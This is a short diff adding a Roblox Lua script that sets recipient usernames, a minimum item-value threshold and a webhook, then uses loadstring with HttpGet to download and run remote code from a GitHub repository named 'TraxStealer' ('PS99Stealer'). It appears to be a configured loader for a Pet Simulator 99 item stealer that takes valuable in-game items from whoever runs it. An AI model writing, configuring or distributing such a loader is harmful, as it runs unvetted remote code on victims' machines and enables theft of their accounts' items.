@@ -1,0 +1,6 @@
+Username = "day2109gatainha"
+Username2 = "Choraprattk"
+MinimumRAP = 100
+Webhook = "Captain Hook"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
